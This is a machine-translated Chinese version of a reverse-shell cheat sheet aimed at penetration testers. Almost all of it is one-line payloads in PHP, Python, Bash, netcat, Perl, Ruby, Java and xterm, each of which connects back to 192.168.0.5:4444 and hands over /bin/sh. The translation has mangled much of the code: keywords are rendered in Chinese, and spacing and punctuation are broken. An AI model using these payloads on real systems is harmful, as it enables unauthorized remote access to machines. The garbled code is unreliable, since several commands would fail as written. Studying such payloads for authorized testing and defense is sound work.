# 反向外壳备忘单 2019

> 原文：<https://kalilinuxtutorials.com/reverse-shell-cheat-sheet/>

如果不可能添加新帐户/ SSH 密钥/。rhosts 文件并登录后，您的下一步很可能是返回一个反向 shell 或将一个 shell 绑定到 TCP 端口。本页讨论的是前者。

如果您足够幸运，在渗透测试中发现了一个命令执行漏洞，那么很快您就会想要一个交互式 shell。

您创建反向 shell 的选择受到目标系统上安装的脚本语言的限制——尽管如果您做好了适当的准备，您也可以上传一个二进制程序。

所示的例子是为类似 Unix 的系统定制的。如果您将“/bin/sh -i”替换为“cmd.exe”，下面的一些示例应该也可以在 Windows 上运行。

下面的每一种方法都旨在成为你可以复制/粘贴的一行程序。因此，它们很短，但可读性不强。

**也可阅读-[reload . sh:重新安装，恢复&通过 SSH 擦除你的系统，无需重启](https://kalilinuxtutorials.com/reload-sh/)**

**Php :**

PHP-r ' $ sock = fsockopen(" 192 . 168 . 0 . 5 "，4444)；exec("/bin/sh-I& 3 2 > & 3 ")；"

**Python** :

python -c '导入套接字、子进程、OS；s=socket.socket(socket。AF_INET，socket。SOCK _ STREAM)；s . connect(" 192 . 168 . 0 . 5 "，4444))；os.dup2(s.fileno()，0)；os.dup2(s.fileno()，1)；os.dup2(s.fileno()，2)；p=subprocess.call(["/bin/sh "，"-I "])；'

**痛击**:

bash-I > &/dev/TCP/192 . 168 . 0 . 5/4444 0 > & 1

**网猫:**

nc -e /bin/sh 192.168.0.5 4444

**Perl :**

perl -e '使用套接字；$i="192.168.0.5 ";$ p = 4545socket(S，PF_INET，SOCK_STREAM，getprotobyname(" TCP "))；if(connect(S，sockaddr_in($p，inet _ aton($ I))){ open(STDIN，" > & S ")；open(STDOUT，" > & S ")；open(STDERR，" > & S ")；exec("/bin/sh-I ")；};'

**红宝石:**

ruby-r socket-e ' f = TCP socket . open(" 192 . 168 . 0 . 5 "，4444)。to _ I；exec sprintf("/bin/sh-I& % D2 > & % d "，f，f，f)'

**Java :**

r = runtime . get runtime()
p = r . exec(["/bin/bash "，-c "，" exec 5<>/dev/TCP/192 . 168 . 0 . 5/4444；猫< & 5 |边读边行；do \ $ line 2>5>5；done"] as String[])
p.waitFor()

**xterm :**

xterm-显示 192.168.0.5:4444

[**Download**](https://github.com/ismailtasdelen/reverse-shell-cheatsheet)